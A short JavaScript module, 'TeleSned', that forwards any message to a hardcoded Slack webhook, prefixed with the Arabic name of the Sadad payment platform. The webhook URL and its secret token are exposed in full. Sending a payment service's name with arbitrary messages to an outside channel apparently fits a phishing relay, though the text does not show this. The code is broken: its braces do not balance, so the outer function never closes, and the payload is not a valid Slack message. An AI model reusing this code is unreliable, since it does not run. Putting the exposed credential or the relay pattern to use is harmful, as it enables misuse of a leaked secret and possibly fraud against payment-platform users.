import axios from 'axios';
export const TeleSned = () => {
    const Send = async (message) => {
        const webhookUrl = 'https://hooks.slack.com/services/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';
        const data = `منصة سداد \n ${message}`
        axios.post(webhookUrl,JSON.stringify(data),{
           withCredentials:false,
           transformRequest:[
               (data,headers) =>{
                   return data
               }
           ]
        });
    return {
        Send,
    };
};

export default TeleSned;
